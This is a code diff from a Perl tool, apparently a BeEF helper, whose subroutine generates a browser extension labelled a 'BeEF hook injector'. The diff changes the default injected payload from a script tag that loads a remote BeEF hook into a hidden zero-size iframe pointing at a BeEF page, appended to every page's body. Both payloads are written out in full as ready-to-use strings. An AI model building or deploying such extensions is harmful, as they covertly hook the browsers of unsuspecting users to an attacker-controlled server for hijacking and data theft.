@@ -2392,10 +2392,10 @@ sub generate_beefcli_plug {
 	cmd_async("mkdir " . $plug_project . "/" . $name_project_folder . ""); 
 	cmd($console , "xterm -e 'python ". $kango_path . " create " . $plug_project . "/" . $name_project_folder . "'"); 
 	sleep(500); show_message("Name your project in the output terminal before clicking OK and continue");
-	#$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<iframe src=" . $beefdemo . " width=0 height=0 style=\\\"visibility: hidden\\\" scrolling=no frameborder=0 seamless=seamless></iframe>");
-	$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<script language=javascript type=text/javascript>var script = document.createElement('script'); script.setAttribute(\\\"src\\\", \\\"". $beefhook . "\\\"); (document.body || document.head || document.documentElement).appendChild(script); </script>");
-	#$content_js = "document.body.innerHTML = document.body.innerHTML + \"" . $js_to_injected . "\"";
-	$content_js = $js_to_injected ;
+	$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<iframe src=" . $beefdemo . " width=0 height=0 style=\\\"visibility: hidden\\\" scrolling=no frameborder=0 seamless=seamless></iframe>");
+	#$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<script language=javascript type=text/javascript>var script = document.createElement('script'); script.setAttribute(\\\"src\\\", \\\"". $beefhook . "\\\"); (document.body || document.head || document.documentElement).appendChild(script); </script>");
+	$content_js = "document.body.innerHTML = document.body.innerHTML + \"" . $js_to_injected . "\"";
+	#$content_js = $js_to_injected ;
 	$plug_description = prompt_text("Description of your Extension", "BeEF hook injector. You better change this description " );
 	$homepage_url = prompt_text("Extension Home Page:","http://beefproject.com/" );
 	$plug_creator = prompt_text("Extension Author:", "@thebenygreen");
